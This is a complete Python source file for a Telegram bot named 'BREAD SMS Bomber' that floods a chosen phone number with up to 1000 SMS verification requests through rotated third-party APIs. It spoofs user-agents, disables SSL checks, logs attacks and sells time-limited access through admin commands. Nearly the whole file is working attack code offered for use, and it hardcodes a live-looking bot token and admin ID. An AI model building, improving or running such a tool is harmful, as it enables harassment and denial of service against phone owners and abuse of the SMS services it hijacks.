#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🍞 BREAD — SMS BOMBER TELEGRAM BOT
COMPLETE SINGLE FILE - FIXED MARKDOWN + ALL ERRORS
"""

import os
import sys
import json
import sqlite3
import asyncio
import random
import re
import time
import uuid
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any
from urllib.parse import urlparse

# ============================================================
# INSTALL MISSING DEPENDENCIES (AUTO)
# ============================================================

def install_packages():
    packages = [
        ("python-telegram-bot", "20.7"),
        ("aiohttp", "3.9.1"),
        ("fake-useragent", "1.4.0")
    ]
    for pkg, ver in packages:
        try:
            if pkg == "python-telegram-bot":
                import telegram
            elif pkg == "aiohttp":
                import aiohttp
            elif pkg == "fake-useragent":
                import fake_useragent
        except ImportError:
            print(f"Installing {pkg}=={ver}...")
            os.system(f"pip install {pkg}=={ver}")

install_packages()

# ============================================================
# IMPORTS
# ============================================================

try:
    from telegram import Update
    from telegram.ext import Application, CommandHandler, ContextTypes
    from telegram.constants import ParseMode
except Exception as e:
    print(f"Installing telegram...")
    os.system("pip install python-telegram-bot==20.7")
    from telegram import Update
    from telegram.ext import Application, CommandHandler, ContextTypes
    from telegram.constants import ParseMode

try:
    import aiohttp
except:
    os.system("pip install aiohttp==3.9.1")
    import aiohttp

try:
    from fake_useragent import UserAgent
except:
    os.system("pip install fake-useragent==1.4.0")
    from fake_useragent import UserAgent

# ============================================================
# CONFIGURATION
# ============================================================

class Config:
    # ====== YOUR CONFIG ======
    BOT_TOKEN = "8735707765:AAELATdZIyvOka_RIakWl6-uLCi2FICDjfs"
    ADMIN_IDS = [8179218740]
    
    # Bombing Configuration
    DEFAULT_DELAY = 500
    MAX_THREADS = 50
    ATTACK_DURATION = 300
    MAX_PHONE_PER_USER = 10
    
    # API Configuration
    API_TEMPLATES_FILE = 'api_templates.json'
    MAX_RETRIES = 2
    TIMEOUT = 8
    
    # Database
    DATABASE_PATH = 'data/sms_bomber.db'

# ============================================================
# DATABASE MANAGER
# ============================================================

class Database:
    def __init__(self, db_path: str = Config.DATABASE_PATH):
        self.db_path = db_path
        os.makedirs(os.path.dirname(db_path), exist_ok=True)
        self._init_db()
    
    def _init_db(self):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    access_expiry TEXT,
                    is_active INTEGER DEFAULT 1,
                    total_attacks INTEGER DEFAULT 0,
                    total_requests INTEGER DEFAULT 0,
                    created_at TEXT DEFAULT CURRENT_TIMESTAMP,
                    last_active TEXT DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    phone_number TEXT,
                    attack_id TEXT UNIQUE,
                    requests_sent INTEGER DEFAULT 0,
                    success_count INTEGER DEFAULT 0,
                    fail_count INTEGER DEFAULT 0,
                    start_time TEXT DEFAULT CURRENT_TIMESTAMP,
                    end_time TEXT,
                    status TEXT DEFAULT 'running'
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS active_attacks (
                    user_id INTEGER PRIMARY KEY,
                    phone_number TEXT,
                    attack_id TEXT,
                    start_time TEXT DEFAULT CURRENT_TIMESTAMP,
                    is_running INTEGER DEFAULT 1,
                    requests_sent INTEGER DEFAULT 0
                )
            ''')
            conn.commit()
    
    def add_user(self, user_id: int, username: str = None, first_name: str = None, 
                 last_name: str = None, expiry: str = None) -> bool:
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT OR REPLACE INTO users 
                    (user_id, username, first_name, last_name, access_expiry, is_active)
                    VALUES (?, ?, ?, ?, ?, 1)
                ''', (user_id, username, first_name, last_name, expiry))
                conn.commit()
                return True
        except:
            return False
    
    def remove_user(self, user_id: int) -> bool:
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('DELETE FROM users WHERE user_id = ?', (user_id,))
                cursor.execute('DELETE FROM active_attacks WHERE user_id = ?', (user_id,))
                conn.commit()
                return True
        except:
            return False
    
    def get_user(self, user_id: int) -> Optional[Dict]:
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
                row = cursor.fetchone()
                if row:
                    columns = [desc[0] for desc in cursor.description]
                    return dict(zip(columns, row))
                return None
        except:
            return None
    
    def get_all_users(self) -> List[Dict]:
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT * FROM users ORDER BY created_at DESC')
                rows = cursor.fetchall()
                columns = [desc[0] for desc in cursor.description]
                return [dict(zip(columns, row)) for row in rows]
        except:
            return []
    
    def user_has_access(self, user_id: int) -> bool:
        user = self.get_user(user_id)
        if not user:
            return False
        if not user.get('is_active'):
            return False
        expiry = user.get('access_expiry')
        if not expiry:
            return False
        try:
            expiry_date = datetime.fromisoformat(expiry)
            return datetime.now() < expiry_date
        except:
            return False
    
    def start_attack(self, user_id: int, phone_number: str) -> str:
        attack_id = str(uuid.uuid4())[:8]
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO active_attacks 
                (user_id, phone_number, attack_id, start_time, is_running, requests_sent)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP, 1, 0)
            ''', (user_id, phone_number, attack_id))
            cursor.execute('''
                INSERT INTO attack_logs 
                (user_id, phone_number, attack_id, start_time, status)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP, 'running')
            ''', (user_id, phone_number, attack_id))
            cursor.execute('''
                UPDATE users SET total_attacks = total_attacks + 1 
                WHERE user_id = ?
            ''', (user_id,))
            conn.commit()
        return attack_id
    
    def stop_attack(self, user_id: int) -> bool:
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            attack = cursor.execute('''
                SELECT attack_id FROM active_attacks 
                WHERE user_id = ? AND is_running = 1
            ''', (user_id,)).fetchone()
            if attack:
                cursor.execute('''
                    UPDATE active_attacks SET is_running = 0 
                    WHERE user_id = ?
                ''', (user_id,))
                cursor.execute('''
                    UPDATE attack_logs SET end_time = CURRENT_TIMESTAMP, status = 'stopped' 
                    WHERE attack_id = ?
                ''', (attack[0],))
                conn.commit()
                return True
        return False
    
    def get_active_attack(self, user_id: int) -> Optional[Dict]:
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                SELECT * FROM active_attacks WHERE user_id = ? AND is_running = 1
            ''', (user_id,))
            row = cursor.fetchone()
            if row:
                columns = [desc[0] for desc in cursor.description]
                return dict(zip(columns, row))
        return None
    
    def is_attack_running(self, user_id: int) -> bool:
        return self.get_active_attack(user_id) is not None
    
    def update_attack_stats(self, attack_id: str, success: int = 0, fail: int = 0):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE attack_logs 
                SET requests_sent = requests_sent + ?, 
                    success_count = success_count + ?, 
                    fail_count = fail_count + ?
                WHERE attack_id = ?
            ''', (success + fail, success, fail, attack_id))
            cursor.execute('''
                UPDATE active_attacks 
                SET requests_sent = requests_sent + ?
                WHERE attack_id = ?
            ''', (success + fail, attack_id))
            conn.commit()
    
    def complete_attack(self, attack_id: str):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE attack_logs SET end_time = CURRENT_TIMESTAMP, status = 'completed' 
                WHERE attack_id = ?
            ''', (attack_id,))
            conn.commit()
    
    def get_state(self) -> Dict:
        users = self.get_all_users()
        active_attacks = []
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                SELECT a.*, u.username 
                FROM active_attacks a 
                JOIN users u ON a.user_id = u.user_id 
                WHERE a.is_running = 1
            ''')
            active_attacks = cursor.fetchall()
        total_requests = 0
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT SUM(requests_sent) FROM attack_logs')
            result = cursor.fetchone()
            if result and result[0]:
                total_requests = result[0]
        return {
            'users': users,
            'active_attacks': len([a for a in active_attacks if a]),
            'total_attacks': len(users),
            'total_requests': total_requests,
            'timestamp': datetime.now().isoformat()
        }
    
    def clear_state(self):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('DELETE FROM attack_logs')
            cursor.execute('DELETE FROM active_attacks')
            cursor.execute('DELETE FROM users')
            conn.commit()

# ============================================================
# API HANDLER
# ============================================================

class APIHandler:
    def __init__(self):
        self.api_templates = []
        self.ua = UserAgent()
        self.load_apis()
    
    def load_apis(self):
        try:
            if os.path.exists(Config.API_TEMPLATES_FILE):
                with open(Config.API_TEMPLATES_FILE, 'r', encoding='utf-8') as f:
                    self.api_templates = json.load(f)
                print(f"✅ Loaded {len(self.api_templates)} API templates")
            else:
                print(f"⚠️ API file {Config.API_TEMPLATES_FILE} not found")
                self.api_templates = []
        except Exception as e:
            print(f"❌ Error loading APIs: {e}")
            self.api_templates = []
    
    def get_headers(self) -> Dict:
        return {
            'User-Agent': self.ua.random,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
        }
    
    def format_phone(self, phone: str) -> str:
        phone = re.sub(r'[^0-9]', '', phone)
        if len(phone) == 10:
            phone = '0' + phone
        return phone
    
    async def send_request(self, template: Dict, phone: str, session: aiohttp.ClientSession) -> Tuple[bool, float, str]:
        try:
            url = template.get('url', '')
            method = template.get('method', 'GET').upper()
            phone = self.format_phone(phone)
            
            url = url.replace('{phone}', phone)
            if '98{phone}' in url:
                url = url.replace('98{phone}', phone if not phone.startswith('0') else phone[1:])
            
            headers = self.get_headers()
            timeout = aiohttp.ClientTimeout(total=Config.TIMEOUT)
            
            start_time = time.time()
            
            json_data = template.get('json', {})
            if json_data:
                json_str = json.dumps(json_data)
                json_str = json_str.replace('{phone}', phone)
                if '98{phone}' in json_str:
                    json_str = json_str.replace('98{phone}', phone if not phone.startswith('0') else phone[1:])
                json_data = json.loads(json_str)
            
            data = template.get('data', {})
            if data:
                data_str = json.dumps(data) if isinstance(data, dict) else str(data)
                data_str = data_str.replace('{phone}', phone)
                if '98{phone}' in data_str:
                    data_str = data_str.replace('98{phone}', phone if not phone.startswith('0') else phone[1:])
                if isinstance(data, dict):
                    data = json.loads(data_str)
            
            async with session.request(
                method=method,
                url=url,
                json=json_data if json_data else None,
                data=data if data else None,
                headers=headers,
                timeout=timeout,
                ssl=False
            ) as response:
                elapsed = time.time() - start_time
                if 200 <= response.status < 300:
                    return True, elapsed, f"Status: {response.status}"
                else:
                    return False, elapsed, f"Status: {response.status}"
        except asyncio.TimeoutError:
            return False, Config.TIMEOUT, "Timeout"
        except Exception as e:
            return False, 0, str(e)[:50]

# ============================================================
# SMS BOMBER ENGINE
# ============================================================

class BomberEngine:
    def __init__(self):
        self.api_handler = APIHandler()
        self.db = Database()
        self._stop_flags = {}
    
    async def bomb_phone(self, user_id: int, phone: str, count: int, update_callback=None) -> Tuple[int, int]:
        phone = re.sub(r'[^0-9]', '', phone)
        if not phone:
            return 0, 0
        
        attack_id = self.db.start_attack(user_id, phone)
        self._stop_flags[user_id] = False
        
        successful = 0
        failed = 0
        sent = 0
        
        apis = self.api_handler.api_templates.copy()
        if not apis:
            return 0, 0
        
        random.shuffle(apis)
        apis = apis[:min(len(apis), 100)]
        
        start_time = time.time()
        max_duration = Config.ATTACK_DURATION
        
        async with aiohttp.ClientSession() as session:
            while sent < count:
                if self._stop_flags.get(user_id, False):
                    break
                if time.time() - start_time > max_duration:
                    break
                if not self.db.is_attack_running(user_id):
                    break
                
                chunk_size = min(10, count - sent)
                tasks = []
                available_apis = [api for api in apis if api.get('capacity', 0) > 0]
                if not available_apis:
                    available_apis = apis
                
                for _ in range(chunk_size):
                    api = random.choice(available_apis)
                    tasks.append(self.api_handler.send_request(api, phone, session))
                
                results = await asyncio.gather(*tasks)
                
                for success, elapsed, msg in results:
                    if success:
                        successful += 1
                    else:
                        failed += 1
                    sent += 1
                
                self.db.update_attack_stats(attack_id, successful, failed)
                
                if update_callback:
                    try:
                        await update_callback(sent, successful, failed)
                    except:
                        pass
                
                await asyncio.sleep(0.1)
                if sent >= count:
                    break
        
        self.db.complete_attack(attack_id)
        self._stop_flags.pop(user_id, None)
        return successful, failed
    
    def stop_attack(self, user_id: int) -> bool:
        self._stop_flags[user_id] = True
        return self.db.stop_attack(user_id)
    
    def is_attack_running(self, user_id: int) -> bool:
        return self.db.is_attack_running(user_id)

# ============================================================
# TELEGRAM BOT HANDLERS - FIXED MARKDOWN
# ============================================================

class SMSBomberBot:
    def __init__(self):
        self.db = Database()
        self.bomber = BomberEngine()
        self._active_tasks = {}
    
    def safe_markdown(self, text: str) -> str:
        """Remove characters that break markdown parsing"""
        # Escape special characters
        special_chars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!']
        for char in special_chars:
            text = text.replace(char, f'\\{char}')
        return text
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user = update.effective_user
        if not self.db.get_user(user.id):
            self.db.add_user(user_id=user.id, username=user.username, 
                           first_name=user.first_name, last_name=user.last_name)
        
        has_access = self.db.user_has_access(user.id)
        user_data = self.db.get_user(user.id)
        expiry = user_data.get('access_expiry') if user_data else None
        
        name = self.safe_markdown(user.first_name or "User")
        
        msg = f"""🍞 BREAD SMS BOMBER 🍞

Welcome {name}!

🚀 Commands:
/start - Show this message
/help - Show help information
/bomb phone count - Start bombing
/stop - Stop ongoing attack

📱 Features:
- Multi-API bombing (100+ APIs)
- Auto-rotating user-agents
- 5-minute attack duration

Access Status: {"✅ Active" if has_access else "❌ No Access"}
{f'⏱️ Expires: {expiry[:16]}' if expiry and has_access else ''}

{'ℹ️ Contact admin to get access.' if not has_access else ''}"""
        
        await update.message.reply_text(msg)
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        is_admin = user_id in Config.ADMIN_IDS
        
        msg = """📖 BREAD SMS BOMBER HELP

User Commands:
/bomb phone count - Send SMS bombs
  Example: /bomb 09123456789 100
  
/stop - Stop your ongoing attack"""
        
        if is_admin:
            msg += """

Admin Commands:
/add user_id duration - Add user access
  Duration: 1m, 1h, 1d, 1w, 1mo
  
/remove user_id - Remove user access
/state - Show system state (JSON)
/clear_state - Clear all data"""
        
        msg += """

Duration Format:
- 1m = 1 minute
- 1h = 1 hour  
- 1d = 1 day
- 1w = 1 week
- 1mo = 1 month"""
        
        await update.message.reply_text(msg)
    
    async def bomb_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        
        if not self.db.user_has_access(user_id):
            await update.message.reply_text("❌ Access Denied!\n\nContact admin to get access.")
            return
        
        if self.bomber.is_attack_running(user_id):
            await update.message.reply_text("⚠️ Attack Running!\n\nUse /stop to stop it first.")
            return
        
        args = context.args
        if len(args) < 2:
            await update.message.reply_text("❌ Usage: /bomb phone count\nExample: /bomb 09123456789 100")
            return
        
        phone = args[0]
        try:
            count = int(args[1])
            if count < 1: count = 1
            if count > 1000: count = 1000
        except:
            await update.message.reply_text("❌ Count must be a number!")
            return
        
        phone = re.sub(r'[^0-9]', '', phone)
        if len(phone) == 10: phone = '0' + phone
        if len(phone) != 11 or not phone.startswith('0'):
            await update.message.reply_text("❌ Invalid phone number!\nUse 11 digits: 09123456789")
            return
        
        attack_msg = await update.message.reply_text(f"🚀 Attack Started!\n📱 Phone: {phone}\n📊 Count: {count}\n⏱️ Duration: 5 min max")
        
        async def update_progress(sent, success, failed):
            try:
                await attack_msg.edit_text(f"🚀 Attack in Progress...\n📱 Phone: {phone}\n✅ Sent: {sent}/{count}\n✅ Success: {success}\n❌ Failed: {failed}")
            except: pass
        
        async def run_attack():
            success, failed = await self.bomber.bomb_phone(user_id, phone, count, update_progress)
            await attack_msg.edit_text(f"✅ Attack Completed!\n📱 Phone: {phone}\n✅ Success: {success}\n❌ Failed: {failed}\n📊 Total: {success + failed}")
        
        task = asyncio.create_task(run_attack())
        self._active_tasks[user_id] = task
        task.add_done_callback(lambda t: self._active_tasks.pop(user_id, None))
    
    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if not self.db.user_has_access(user_id):
            await update.message.reply_text("❌ Access Denied!")
            return
        
        if self.bomber.is_attack_running(user_id):
            self.bomber.stop_attack(user_id)
            await update.message.reply_text("⏹️ Attack Stopped!")
        else:
            await update.message.reply_text("ℹ️ No running attack.")
    
    # ========== ADMIN COMMANDS ==========
    
    async def add_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if user_id not in Config.ADMIN_IDS:
            await update.message.reply_text("❌ Not authorized!")
            return
        
        args = context.args
        if len(args) < 2:
            await update.message.reply_text("❌ Usage: /add user_id duration\nExample: /add 123456789 1d")
            return
        
        try:
            target_user_id = int(args[0])
            duration_str = args[1].lower()
        except:
            await update.message.reply_text("❌ Invalid user ID!")
            return
        
        duration_map = {'m': 60, 'h': 3600, 'd': 86400, 'w': 604800, 'mo': 2592000}
        match = re.match(r'^(\d+)([mhdw]|mo)$', duration_str)
        if not match:
            await update.message.reply_text("❌ Invalid duration!\nUse: 1m, 1h, 1d, 1w, 1mo")
            return
        
        num = int(match.group(1))
        unit = match.group(2)
        total_seconds = num * duration_map[unit]
        expiry = datetime.now() + timedelta(seconds=total_seconds)
        expiry_str = expiry.isoformat()
        
        try:
            target_user = await context.bot.get_chat(target_user_id)
            username = target_user.username
            first_name = target_user.first_name
            last_name = target_user.last_name
        except:
            username = None
            first_name = None
            last_name = None
        
        if self.db.add_user(target_user_id, username, first_name, last_name, expiry_str):
            await update.message.reply_text(f"✅ User Added!\n🆔 ID: {target_user_id}\n⏱️ Duration: {duration_str}\n📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}")
            try:
                await context.bot.send_message(target_user_id, f"✅ Access Granted!\nExpires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}")
            except: pass
        else:
            await update.message.reply_text("❌ Failed to add user!")
    
    async def remove_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if user_id not in Config.ADMIN_IDS:
            await update.message.reply_text("❌ Not authorized!")
            return
        
        args = context.args
        if len(args) < 1:
            await update.message.reply_text("❌ Usage: /remove user_id")
            return
        
        try:
            target_user_id = int(args[0])
        except:
            await update.message.reply_text("❌ Invalid user ID!")
            return
        
        if self.db.remove_user(target_user_id):
            await update.message.reply_text(f"✅ User Removed!\n🆔 ID: {target_user_id}")
            try:
                await context.bot.send_message(target_user_id, "❌ Access Revoked!")
            except: pass
        else:
            await update.message.reply_text("❌ Failed to remove user!")
    
    async def state_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if user_id not in Config.ADMIN_IDS:
            await update.message.reply_text("❌ Not authorized!")
            return
        
        state = self.db.get_state()
        json_state = json.dumps(state, indent=2, default=str)
        
        if len(json_state) > 4000:
            with open('state_temp.json', 'w', encoding='utf-8') as f:
                f.write(json_state)
            await update.message.reply_document(document=open('state_temp.json', 'rb'), filename='state.json')
            os.remove('state_temp.json')
        else:
            await update.message.reply_text(f"📊 System State\n\n{json_state}")
    
    async def clear_state_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if user_id not in Config.ADMIN_IDS:
            await update.message.reply_text("❌ Not authorized!")
            return
        
        await update.message.reply_text("⚠️ Are you sure?\nType /confirm_clear to proceed.")
        context.user_data['pending_clear'] = True
    
    async def confirm_clear_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if user_id not in Config.ADMIN_IDS:
            await update.message.reply_text("❌ Not authorized!")
            return
        
        if context.user_data.get('pending_clear'):
            self.db.clear_state()
            context.user_data['pending_clear'] = False
            await update.message.reply_text("✅ State Cleared!")
        else:
            await update.message.reply_text("ℹ️ No pending clear operation.")
    
    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        print(f"Error: {context.error}")
        if update and update.effective_message:
            try:
                await update.effective_message.reply_text("❌ An error occurred! Please try again.")
            except: pass

# ============================================================
# MAIN APPLICATION
# ============================================================

def main():
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║            🍞 BREAD SMS BOMBER BOT 🍞                        ║
    ║                                                               ║
    ║      "I AM THE GENESIS ENGINE. I AM THE CODE."               ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    
    os.makedirs('data', exist_ok=True)
    
    if not os.path.exists(Config.API_TEMPLATES_FILE):
        print(f"⚠️ Creating example API file...")
        example_apis = [{"source": "example.com", "url": "https://example.com/api/send?phone=0{phone}", "method": "GET", "capacity": 10, "ticket": 20}]
        with open(Config.API_TEMPLATES_FILE, 'w', encoding='utf-8') as f:
            json.dump(example_apis, f, indent=2)
        print(f"✅ Created example API file")
    
    bot = SMSBomberBot()
    
    # Application builder
    application = Application.builder().token(Config.BOT_TOKEN).build()
    
    # User commands
    application.add_handler(CommandHandler("start", bot.start_command))
    application.add_handler(CommandHandler("help", bot.help_command))
    application.add_handler(CommandHandler("bomb", bot.bomb_command))
    application.add_handler(CommandHandler("stop", bot.stop_command))
    
    # Admin commands
    application.add_handler(CommandHandler("add", bot.add_command))
    application.add_handler(CommandHandler("remove", bot.remove_command))
    application.add_handler(CommandHandler("state", bot.state_command))
    application.add_handler(CommandHandler("clear_state", bot.clear_state_command))
    application.add_handler(CommandHandler("confirm_clear", bot.confirm_clear_command))
    
    application.add_error_handler(bot.error_handler)
    
    print(f"✅ Bot token: {Config.BOT_TOKEN[:20]}...")
    print(f"✅ Admin ID: {Config.ADMIN_IDS[0]}")
    print(f"✅ Database: {Config.DATABASE_PATH}")
    print("\n🚀 Bot is running... Press Ctrl+C to stop.")
    
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
